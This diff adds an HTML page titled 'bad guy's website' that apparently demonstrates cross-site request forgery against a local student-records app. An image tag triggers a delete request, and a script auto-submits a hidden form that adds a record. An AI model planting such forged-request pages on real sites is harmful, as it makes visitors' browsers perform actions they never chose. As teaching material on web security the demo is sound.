@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>坏人的网站</title>
+</head>
+<body>
+    <h1>互联网真的是太精彩了</h1>
+    <img src="http://localhost:3000/students/delete?id=5">
+    <hr>
+    <!-- <iframe name="xixi" style="display: none;"></iframe> -->
+    <form action="http://localhost:3000/students/add" method="post">
+        <input type="text" name="name" value="十二">
+        <input type="text" name="age" value="20">
+        <input type="text" name="gender" value="女">
+        <input type="text" name="address" value="杭州">
+        <!-- <button>提交</button> -->
+    </form>
+    <script>
+        //自动提交表单
+        document.forms[0].submit()
+    </script>
+</body>
+</html>
